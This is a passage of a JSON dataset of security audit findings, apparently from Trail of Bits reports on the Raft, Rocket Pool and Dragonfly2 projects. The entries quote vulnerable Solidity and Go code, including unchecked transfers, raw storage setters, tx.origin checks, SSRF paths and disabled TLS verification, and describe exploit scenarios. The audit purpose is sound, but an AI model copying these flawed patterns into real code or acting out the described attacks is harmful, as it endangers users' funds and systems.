to round. Long term, carefully investigate oracle integrations for potential footguns in order to conform to correct API usage. References  The Historical-Price-Feed-Data Project",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Incorrect constant for 1000-year periods ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf",
        "body": "The Raft nance contracts rely on computing the exponential decay to determine the correct base rate for redemptions. In the MathUtils library, a period of 1000 years is chosen as the maximum time period for the decay exponent to prevent an overow. However, the _MINUTES_IN_1000_YEARS constant used is currently incorrect: /// @notice Number of minutes in 1000 years. uint256 internal constant _MINUTES_IN_1000_YEARS = 1000 * 356 days / 1 minutes; Figure 3.1: The declaration of the _MINUTES_IN_1000_YEARS constant Recommendations Short term, change the code to compute the _MINUTES_IN_1000_YEARS constant as 1000 * 365 days / 1 minutes . Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the system. Integrate Echidna and smart contract fuzzing in the system to triangulate subtle arithmetic issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Inconsistent use of safeTransfer for collateralToken ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf",
        "body": "The Raft contracts rely on ERC-20 tokens as collateral that must be deposited in order to mint R tokens. However, although the SafeERC20 library is used for collateral token transfers, there are a few places where the safeTransfer function is missing:  The transfer of collateralToken in the liquidate function in the PositionManager contract: if (!isRedistribution) { rToken.burn( msg.sender , entirePositionDebt); _totalDebt -= entirePositionDebt; emit TotalDebtChanged(_totalDebt); // Collateral is sent to protocol as a fee only in case of liquidation collateralToken.transfer(feeRecipient, collateralLiquidationFee); } collateralToken.transfer( msg.sender , collateralToSendToLiquidator); Figure 4.1: Unchecked transfers in PositionManager.liquidate  The transfer of stETH in the managePositionStETH function in the PositionManagerStETH contract: { if (isCollateralIncrease) { stETH.transferFrom( msg.sender , address ( this ), collateralChange); stETH.approve( address (wstETH), collateralChange); uint256 wstETHAmount = wstETH.wrap(collateralChange); _managePosition( ... ); } else { _managePosition( ... ); uint256 stETHAmount = wstETH.unwrap(collateralChange); stETH.transfer( msg.sender , stETHAmount); } } Figure 4.2: Unchecked transfers in PositionManagerStETH.managePositionStETH Exploit Scenario Governance approves an ERC-20 token that returns a Boolean on failure to be used as collateral. However, since the return values of this ERC-20 token are not checked, Alice, a liquidator, does not receive any collateral for performing a liquidation. Recommendations Short term, use the SafeERC20 librarys safeTransfer function for the collateralToken . Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Tokens may be trapped in an invalid position ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf",
        "body": "The Raft nance contracts allow users to take out positions by depositing collateral and minting a corresponding amount of R tokens as debt. In order to exit a position, a user must pay back their debt, which allows them to receive their collateral back. To check that a position is closed, the _managePosition function contains a branch that validates that the position's debt is zero after adjustment. However, if the position's debt is zero but there is still some collateral present even after adjustment, then the position is considered invalid and cannot be closed. This could be problematic, especially if some dust is present in the position after the collateral is withdrawn. if (positionDebt == 0 ) { if (positionCollateral != 0 ) { revert InvalidPosition(); } // position was closed, remove it _closePosition(collateralToken, position, false ); } else { _checkValidPosition(collateralToken, positionDebt, positionCollateral); if (newPosition) { collateralTokenForPosition[position] = collateralToken; emit PositionCreated(position); } } Figure 5.1: A snippet from the _managePosition function showing that a position with no debt cannot be closed if any amount of collateral remains Exploit Scenario Alice, a borrower, wants to pay back her debt and receive her collateral in exchange. However, she accidentally leaves some collateral in her position despite paying back all her debt. As a result, her position cannot be closed. Recommendations Short term, if a position's debt is zero, have the _managePosition function refund any excess collateral and close the position. Long term, carefully investigate potential edge cases in the system and use smart contract fuzzing to determine if those edge cases can be realistically reached.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Price deviations between stETH and ETH may cause Tellor oracle to return an incorrect price ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf",
        "body": "The Raft nance contracts rely on oracles to compute the price of the collateral tokens used throughout the codebase. If the Chainlink oracle is down, the Tellor oracle is used as a backup. However, the Tellor oracle does not use the stETH/USD price feed. Instead it uses the ETH/USD price feed to determine the price of stETH. This could be problematic if stETH depegs, which can occur during black swan events. function _getCurrentTellorResponse() internal view returns (TellorResponse memory tellorResponse) { uint256 count; uint256 time; uint256 value; try tellor.getNewValueCountbyRequestId(ETHUSD_TELLOR_REQ_ID) returns ( uint256 count_) { count = count_; } catch { return (tellorResponse); } Figure 6.1: The Tellor oracle fetching the price of ETH to determine the price of stETH Exploit Scenario Alice has a position in the system. A signicant black swan event causes the depeg of staked Ether. As a result, the Tellor oracle returns an incorrect price, which prevents Alice's position from being liquidated despite being eligible for liquidation. Recommendations Short term, carefully monitor the Tellor oracle, especially during any sort of market volatility. Long term, investigate the robustness of the oracles and document possible circumstances that could cause them to return incorrect prices.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Incorrect constant value for MAX_REDEMPTION_SPREAD ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf",
        "body": "The Raft protocol allows a user to redeem their R tokens for underlying wstETH at any time. By doing so, the protocol ensures that it maintains overcollateralization. The redemption spread is part of the redemption rate, which changes based on the price of the R token to incentivize or disincentivize redemption. However, the documentation says that the maximum redemption spread should be 100% and that the protocol will initially set it to 100%. In the code, the MAX_REDEMPTION_SPREAD constant is set to 2%, and the redemptionSpread variable is set to 1% at construction. This is problematic because setting the rate to 100% is necessary to eectively disable redemptions at launch. uint256 public constant override MIN_REDEMPTION_SPREAD = MathUtils._100_PERCENT / 10_000 * 25 ; // 0.25% uint256 public constant override MAX_REDEMPTION_SPREAD = MathUtils._100_PERCENT / 100 * 2 ; // 2% Figure 7.1: Constants specifying the minimum and maximum redemption spread percentages constructor (ISplitLiquidationCollateral newSplitLiquidationCollateral) FeeCollector( msg.sender ) { rToken = new RToken( address ( this ), msg.sender ); raftDebtToken = new ERC20Indexable( address ( this ), string ( bytes .concat( \"Raft \" , bytes (IERC20Metadata( address (rToken)).name()), \" debt\" )), string ( bytes .concat( \"r\" , bytes (IERC20Metadata( address (rToken)).symbol()), \"-d\" )) ); setRedemptionSpread(MathUtils._100_PERCENT / 100 ); setSplitLiquidationCollateral(newSplitLiquidationCollateral); emit PositionManagerDeployed(rToken, raftDebtToken, msg.sender ); } Figure 7.2: The redemption spread being set to 1% instead of 100% in the PositionManager s constructor Exploit Scenario The protocol sets the redemption spread to 2%. Alice, a borrower, redeems her R tokens for some underlying wstETH, despite the developers intentions. As a result, the stablecoin experiences signicant volatility. Recommendations Short term, set the MAX_REDEMPTION_SPREAD value to 100% and set the redemptionSpread variable to MAX_REDEMPTION_SPREAD in the PositionManager contracts constructor. Long term, improve unit test coverage to identify incorrect behavior and edge cases in the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Liquidation rewards are calculated incorrectly ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf",
        "body": "Whenever a position's collateralization ratio falls between 100% and 110%, the position becomes eligible for liquidation. A liquidator can pay o the position's total debt to restore solvency. In exchange, the liquidator receives a liquidation reward for removing bad debt, in addition to the amount of debt the liquidator has paid o. However, the calculation performed in the split function is incorrect and does not reward the liquidator with the matchingCollateral amount of tokens: function split( uint256 totalCollateral, uint256 totalDebt, uint256 price, bool isRedistribution ) external pure returns ( uint256 collateralToSendToProtocol, uint256 collateralToSentToLiquidator) { if (isRedistribution) { ... } else { uint256 matchingCollateral = totalDebt.divDown(price); uint256 excessCollateral = totalCollateral - matchingCollateral; uint256 liquidatorReward = excessCollateral.mulDown(_calculateLiquidatorRewardRate(totalDebt)); collateralToSendToProtocol = excessCollateral - liquidatorReward; collateralToSentToLiquidator = liquidatorReward; } } Figure 8.1: The calculations for how to split the collateral between the liquidator and the protocol, showing that the matchingCollateral is omitted from the liquidators reward Exploit Scenario Alice, a liquidator, attempts to liquidate an insolvent position. However, upon liquidation, she receives only the liquidationReward amount of tokens, without the matchingCollateral . As a result her liquidation is unprotable and she has lost funds. Recommendations Short term, have the code compute the collateralToSendToLiquidator variable as liquidationReward + matchingCollateral . Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the protocol. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Any network contract can change any nodes withdrawal address ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "body": "The RocketStorage contract uses the eternal storage pattern. The contract is a key-value store that all protocol contracts can write to and read. However, RocketStorage has a special protected storage area that should not be writable by network contracts (gure 1.1); it should be writable only by node operators under specic conditions. This area stores data related to node operators withdrawal addresses and is critical to the security of their assets. // Protected storage (not accessible by network contracts) mapping(address => address) private withdrawalAddresses; mapping(address => address) private pendingWithdrawalAddresses; Figure 1.1: Protected storage in the RocketStorage contract (RocketStorage.sol#L24-L26) RocketStorage also has a number of setters for types that t in to a single storage slot. These setters are implemented by the raw sstore opcode (gure 1.2) and can be used to set any storage slot to any value. They can be called by any network contract, and the caller will have full control of storage slots and values. function setUint(bytes32 _key, uint _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 1.2: An example of a setter that uses sstore in the RocketStorage contract (RocketStorage.sol#L205-209) As a result, all network contracts can write to all storage slots in the RocketStorage contract, including those in the protected area. There are three setters that can set any storage slot to any value under any condition: setUint, setInt, and setBytes32. The addUint setter can be used if the unsigned integer representation of the value is larger than the current value; subUint can be used if it is smaller. Other setters such as setAddress and setBool can be used to set a portion of a storage slot to a value; the rest of the storage slot is zeroed out. However, they can still be used to delete any storage slot. In addition to undermining the security of the protected storage areas, these direct storage-slot setters make the code vulnerable to accidental storage-slot clashes. The burden of ensuring security is placed on the caller, who must pass in a properly hashed key. A bug could easily lead to the overwriting of the guardian, for example. Exploit Scenario Alice, a node operator, trusts Rocket Pools guarantee that her deposit will be protected even if other parts of the protocol are compromised. Attacker Charlie upgrades a contract that has write access to RocketStorage to a malicious version. Charlie then computes the storage slot of each node operators withdrawal address, including Alices, and calls rocketStorage.setUint(slot, charliesAddress) from the malicious contract. He can then trigger withdrawals and steal node operators funds. Recommendations Short term, remove all sstore operations from the RocketStorage contract. Use mappings, which are already used for strings and bytes, for all types. When using mappings, each value is stored in a slot that is computed from the hash of the mapping slot and the key, making it impossible for a user to write from one mapping into another unless that user nds a hash collision. Mappings will ensure proper separation of the protected storage areas. Strongly consider moving the protected storage areas and related operations into a separate immutable contract. This would make it much easier to check the access controls on the protected storage areas. Long term, avoid using assembly whenever possible. Ensure that assembly operations such as sstore do not enable the circumvention of access controls.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Current storage pattern fails to ensure type safety ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "body": "As mentioned in TOB-ROCKET-001, the RocketStorage contract uses the eternal storage pattern. This pattern uses assembly to read and write to raw storage slots. Most of the systems data is stored in this manner, which is shown in gures 2.1 and 2.2. function setInt(bytes32 _key, int _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 2.1: RocketStorage.sol#L229-L233 function getUint(bytes32 _key) override external view returns (uint256 r) { assembly { r := sload (_key) } } Figure 2.2: RocketStorage.sol#L159-L163 If the same storage slot were used to write a value of type T and then to read a value of type U from the same slot, the value of U could be unexpected. Since storage is untyped, Soliditys type checker would be unable to catch this type mismatch, and the bug would go unnoticed. Exploit Scenario A codebase update causes one storage slot, S, to be used with two dierent data types. The compiler does not throw any errors, and the code is deployed. During transaction processing, an integer, -1, is written to S. Later, S is read and interpreted as an unsigned integer. Subsequent calculations use the maximum uint value, causing users to lose funds. Recommendations Short term, remove the assembly code and raw storage mapping from the codebase. Use a mapping for each type to ensure that each slot of the mapping stores values of the same type. Long term, avoid using assembly whenever possible. Use Solidity as a high-level language so that its built-in type checker will detect type errors.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "body": "Rocket Pool has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Rocket Pool contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Upgradeable contracts can block minipool withdrawals ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "body": "At the beginning of this audit, the Rocket Pool team mentioned an important invariant: if a node operator is allowed to withdraw funds from a minipool, the withdrawal should always succeed. This invariant is meant to assure node operators that they will be able to withdraw their funds even if the systems governance upgrades network contracts to malicious versions. To withdraw funds from a minipool, a node operator calls the close or refund function, depending on the state of the minipool. The close function calls rocketMinipoolManager.destroyMinipool. The rocketMinipoolManager contract can be upgraded by governance, which could replace it with a version in which destroyMinipool reverts. This would cause withdrawals to revert, breaking the guarantee mentioned above. The refund function does not call any network contracts. However, the refund function cannot be used to retrieve all of the funds that close can retrieve. Governance could also tamper with the withdrawal process by altering node operators withdrawal addresses. (See TOB-ROCKET-001 for more details.) Exploit Scenario Alice, a node operator, owns a dissolved minipool and decides to withdraw her funds. However, before Alice calls close() on her minipool to withdraw her funds, governance upgrades the RocketMinipoolManager contract to a version in which calls to destroyMinipool fail. As a result, the close() functions call to RocketMinipoolManager.destroyMinipool fails, and Alice is unable to withdraw her funds. Recommendations Short term, use Soliditys try catch statement to ensure that withdrawal functions that should always succeed are not aected by function failures in other network contracts. Additionally, ensure that no important data validation occurs in functions whose failures are ignored. Long term, carefully examine the process through which node operators execute withdrawals and ensure that their withdrawals cannot be blocked by other network contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Lack of contract existence check on delegatecall will result in unexpected behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "body": "The RocketMinipool contract uses the delegatecall proxy pattern. If the implementation contract is incorrectly set or is self-destructed, the contract may not detect failed executions. The RocketMinipool contract implements a payable fallback function that is invoked when contract calls are executed. This function does not have a contract existence check: fallback(bytes calldata _input) external payable returns (bytes memory) { // If useLatestDelegate is set, use the latest delegate contract address delegateContract = useLatestDelegate ? getContractAddress(\"rocketMinipoolDelegate\") : rocketMinipoolDelegate; (bool success, bytes memory data) = delegateContract.delegatecall(_input); if (!success) { revert(getRevertMessage(data)); } return data; } Figure 5.1: RocketMinipool.sol#L102-L108 The constructor of the RocketMinipool contract also uses the delegatecall function without performing a contract existence check: constructor(RocketStorageInterface _rocketStorageAddress, address _nodeAddress, MinipoolDeposit _depositType) { [...] (bool success, bytes memory data) = getContractAddress(\"rocketMinipoolDelegate\").delegatecall(abi.encodeWithSignature('initialis e(address,uint8)', _nodeAddress, uint8(_depositType))); if (!success) { revert(getRevertMessage(data)); } } Figure 5.2: RocketMinipool.sol#L30-L43 A delegatecall to a destructed contract will return success as part of the EVM specication. The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 5.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall The contract will not throw an error if its implementation is incorrectly set or self-destructed. It will instead return success even though no code was executed. Exploit Scenario Eve upgrades the RocketMinipool contract to point to an incorrect new implementation. As a result, each delegatecall returns success without changing the state or executing code. Eve uses this failing to scam users. Recommendations Short term, implement a contract existence check before a delegatecall. Document the fact that suicide and selfdestruct can lead to unexpected behavior, and prevent future upgrades from introducing these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. References  Contract Upgrade Anti-Patterns  Breaking Aave Upgradeability",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. tx.origin in RocketStorage authentication may be an attack vector ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "body": "The RocketStorage contract contains all system storage values and the functions through which other contracts write to them. To prevent unauthorized calls, these functions are protected by the onlyLatestRocketNetworkContract modier. function setUint(bytes32 _key, uint _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 6.1: RocketStorage.sol#L205-209 The contract also contains a storageInit ag that is set to true when the system values have been initialized. function setDeployedStatus() external { // Only guardian can lock this down require(msg.sender == guardian, \"Is not guardian account\"); // Set it now storageInit = true; } Figure 6.2: RocketStorage.sol#L89-L94 The onlyLatestRocketNetworkContract modier has a switch and is disabled when the system is in the initialization phase. modifier onlyLatestRocketNetworkContract() { if (storageInit == true) { // Make sure the access is permitted to only contracts in our Dapp require(_getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender))), \"Invalid or outdated network contract\"); } else { // Only Dapp and the guardian account are allowed access during initialisation. // tx.origin is only safe to use in this case for deployment since no external contracts are interacted with require(( tx.origin == guardian _getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender))) || ), \"Invalid or outdated network contract attempting access during deployment\"); } _; } Figure 6.3: RocketStorage.sol#L36-L48 If the system is still in the initialization phase, any call that originates from the guardian account will be trusted. Exploit Scenario Eve creates a malicious airdrop contract, and Alice, the Rocket Pool systems guardian, calls it. The contract then calls RocketStorage and makes a critical storage update. After the updated value has been initialized, Alice sets storageInit to true, but the storage value set in the update persists, increasing the risk of a critical vulnerability. Recommendations Short term, clearly document the fact that during the initialization period, the guardian may not call any external contracts; nor may any system contract that the guardian calls make calls to untrusted parties. Long term, document all of the systems assumptions, both in the portions of code in which they are realized and in all places in which they aect stakeholders operations.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Duplicated storage-slot computation can silently introduce errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "body": "Many parts of the Rocket Pool codebase that access its eternal storage compute storage locations inline, which means that these computations are duplicated throughout the codebase. Many string constants appear in the codebase several times; these include minipool.exists (shown in gure 7.1), which appears four times. Duplication of the same piece of information in many parts of a codebase increases the risk of inconsistencies. Furthermore, because the code lacks existence and type checks for these strings, inconsistencies introduced into a contract by developer error may not be detected unless the contract starts behaving in unexpected ways. setBool(keccak256(abi.encodePacked(\"minipool.exists\", contractAddress)), true); Figure 7.1: RocketMinipoolManager.sol#L216 Many storage-slot computations take parameters. However, there are no checks on the types or number of the parameters that they take, and incorrect parameter values will not be caught by the Solidity compiler. Exploit Scenario Bob, a developer, adds a functionality that sets the network.prices.submitted.node.key string constant. He ABI-encodes the node address, block, and RPL price arguments but forgets to ABI-encode the eective RPL stake amount. The code then sets an entirely new storage slot that is not read anywhere else. As a result, the write operation is a no-op with undened consequences. Recommendations Short term, extract the computation of storage slots into helper functions (like that shown in 7.2). This will ensure that each string constant exists only in a single place, removing the potential for inconsistencies. These functions can also check the types of the parameters used in storage-slot computations. function contractExistsSlot(address contract) external pure returns (bytes32) { return keccak256(abi.encodePacked(\"contract.exists\", contract); } // _getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender)) _getBool(contractExistsSlot(msg.sender)) // setBool(keccak256(abi.encodePacked(\"contract.exists\", _contractAddress)), true) setBool(contractExistsSlot(_contractAddress), true) Figure 7.2: An example of a helper function Long term, replace the raw setters and getters in RocketBase (e.g., setAddress) with setters and getters for specic values (e.g., the setContractExists setter) and restrict RocketStorage access to these setters.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Potential collisions between eternal storage and Solidity mapping storage slots ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "body": "The Rocket Pool code uses eternal storage to store many named mappings. A named mapping is one that is identied by a string (such as minipool.exists) and maps a key (like contractAddress in gure 8.1) to a value. setBool(keccak256(abi.encodePacked(\"minipool.exists\", contractAddress)), true); Figure 8.1: RocketMinipoolManager.sol#L216 Given a mapping whose state variable appears at index N in the code, Solidity stores the value associated with key at a slot that is computed as follows: h = type(key) == string || type(key) == bytes ? keccak256 : left_pad_to_32_bytes slot = keccak256(abi.encodePacked(h(key), N)) Figure 8.2: Pseudocode of the Solidity computation of a mappings storage slot The rst item in a Rocket Pool mapping is the identier, which could enable an attacker to write values into a mapping that should be inaccessible to the attacker. We set the severity of this issue to informational because such an attack does not currently appear to be possible. Exploit Scenario Mapping A stores its state variable at slot n. Rocket Pool developers introduce new code, making it possible for an attacker to change the second argument to abi.encodePacked in the setBool setter (shown in gure 8.1). The attacker passes in a rst argument of 32 bytes and can then pass in n as the second argument and set an entry in Mapping A. Recommendations Short term, switch the order of arguments such that a mappings identier is the last argument and the key (or keys) is the rst (as in keccak256(key, unique_identifier_of_mapping)). Long term, carefully examine all raw storage operations and ensure that they cannot be used by attackers to access storage locations that should be inaccessible to them. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Authentication is not enabled for some Managers endpoints ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The /api/v1/jobs and /preheats endpoints in Manager web UI are accessible without authentication. Any user with network access to the Manager can create, delete, and modify jobs, and create preheat jobs. job := apiv1.Group( \"/jobs\" ) Figure 1.1: The /api/v1/jobs endpoint denition ( Dragonfly2/manager/router/router.go#191 ) // Compatible with the V1 preheat. pv1 := r.Group( \"/preheats\" ) r.GET( \"_ping\" , h.GetHealth) pv1.POST( \"\" , h.CreateV1Preheat) pv1.GET( \":id\" , h.GetV1Preheat) Figure 1.2: The /preheats endpoint denition ( Dragonfly2/manager/router/router.go#206210 ) Exploit Scenario An unauthenticated adversary with network access to a Manager web UI uses /api/v1/jobs endpoint to create hundreds of useless jobs. The Manager is in a denial-of-service state, and stops accepting requests from valid administrators. Recommendations Short term, add authentication and authorization to the /api/v1/jobs and /preheats endpoints. Long term, rewrite the Manager web API so that all endpoints are authenticated and authorized by default, and only selected endpoints explicitly disable these security controls. Alternatively, rewrite the API into public and private parts using groups, as demonstrated in this comment . The proposed design will prevent developers from forgetting to protect some endpoints.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Server-side request forgery vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "There are multiple server-side request forgery (SSRF) vulnerabilities in the DragonFly2 system. The vulnerabilities enable users to force DragonFly2s components to make requests to internal services, which otherwise are not accessible to the users. One SSRF attack vector is exposed by the Managers API. The API allows users to create jobs. When creating a Preheat type of a job, users provide a URL that the Manager connects to (see gures 2.12.3). The URL is weakly validated, and so users can trick the Manager into sending HTTP requests to services that are in the Managers local network. func (p *preheat) CreatePreheat(ctx context.Context, schedulers []models.Scheduler, json types.PreheatArgs) (*internaljob.GroupJobState, error ) { [skipped] url := json.URL [skipped] // Generate download files var files []internaljob.PreheatRequest switch PreheatType(json.Type) { case PreheatImageType: // Parse image manifest url skipped , err := parseAccessURL(url) [skipped] nethttp.MapToHeader(rawheader), image) files, err = p.getLayers(ctx, url, tag, filter, [skipped] case PreheatFileType: [skipped] } Figure 2.1: A method handling Preheat job creation requests ( Dragonfly2/manager/job/preheat.go#89132 ) func (p *preheat) getLayers (ctx context.Context, url, tag, filter string , header http.Header, image *preheatImage) ([]internaljob.PreheatRequest, error ) { ctx, span := tracer.Start(ctx, config.SpanGetLayers, trace.WithSpanKind(trace.SpanKindProducer)) defer span.End() resp, err := p.getManifests(ctx, url, header) Figure 2.2: A method called by the CreatePreheat function ( Dragonfly2/manager/job/preheat.go#176180 ) func (p *preheat) getManifests(ctx context.Context, url string , header http.Header) (*http.Response, error ) { req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil ) if err != nil { return nil , err } req.Header = header req.Header.Add(headers.Accept, schema2.MediaTypeManifest) client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } resp, err := client.Do(req) if err != nil { return nil , err } return resp, nil } Figure 2.3: A method called by the getLayers function ( Dragonfly2/manager/job/preheat.go#211233 ) A second attack vector is in peer-to-peer communication. A peer can ask another peer to make a request to an arbitrary URL by triggering the pieceManager.DownloadSource method (gure 2.4), which calls the httpSourceClient.GetMetadata method, which performs the request. func (pm *pieceManager) DownloadSource(ctx context.Context, pt Task, peerTaskRequest *schedulerv1.PeerTaskRequest, parsedRange *nethttp.Range) error { Figure 2.4: Signature of the DownloadSource function ( Dragonfly2/client/daemon/peer/piece_manager.go#301 ) Another attack vector is due to the fact that HTTP clients used by the DragonFly2s components do not disable support for HTTP redirects. This conguration means that an HTTP request sent to a malicious server may be redirected by the server to a components internal service. Exploit Scenario An unauthenticated user with access to the Manager API registers himself with a guest account. The user creates a preheat jobhe is allowed to do so, because of a bug described in TOB-DF2-1 with a URL pointing to an internal service. The Manager makes the request to the service on behalf of the malicious user. Recommendations Short term, investigate all potential SSRF attack vectors in the DragonFly2 system and mitigate risks by either disallowing requests to internal networks or creating an allowlist conguration that would limit networks that can be requested. Disable automatic HTTP redirects in HTTP clients. Alternatively, inform users about the SSRF attack vectors and provide them with instructions on how to mitigate this attack on the network level (e.g., by conguring rewalls appropriately). Long term, ensure that applications cannot be tricked to issue requests to arbitrary locations provided by its users. Consider implementing a single, centralized class responsible for validating the destinations of requests. This will increase code maturity with respect to HTTP request handling.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Manager makes requests to external endpoints with disabled TLS authentication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The Manager disables TLS certicate verication in two HTTP clients (gures 3.1 and 3.2). The clients are not congurable, so users have no way to re-enable the verication. func getAuthToken(ctx context.Context, header http.Header) ( string , error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.1: getAuthToken function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#261301 ) func (p *preheat) getManifests(ctx context.Context, url string , header http.Header) (*http.Response, error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.2: getManifests function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#211233 ) Exploit Scenario A Manager processes dozens of preheat jobs. An adversary performs a network-level Man-in-the-Middle attack, providing invalid data to the Manager. The Manager preheats with the wrong data, which later causes a denial of service and le integrity problems. Recommendations Short term, make the TLS certicate verication congurable in the getManifests and getAuthToken methods. Preferably, enable the verication by default. Long term, enumerate all HTTP, gRPC, and possibly other clients that use TLS and document their congurable and non-congurable (hard-coded) settings. Ensure that all security-relevant settings are congurable or set to secure defaults. Keep the list up to date with the code. 4. Incorrect handling of a task structures usedTra\u0000c eld Severity: Low Diculty: Medium Type: Data Validation Finding ID: TOB-DF2-4 Target: Dragonfly2/client/daemon/peer/piece_manager.go",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Directories created via os.MkdirAll are not checked for permissions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
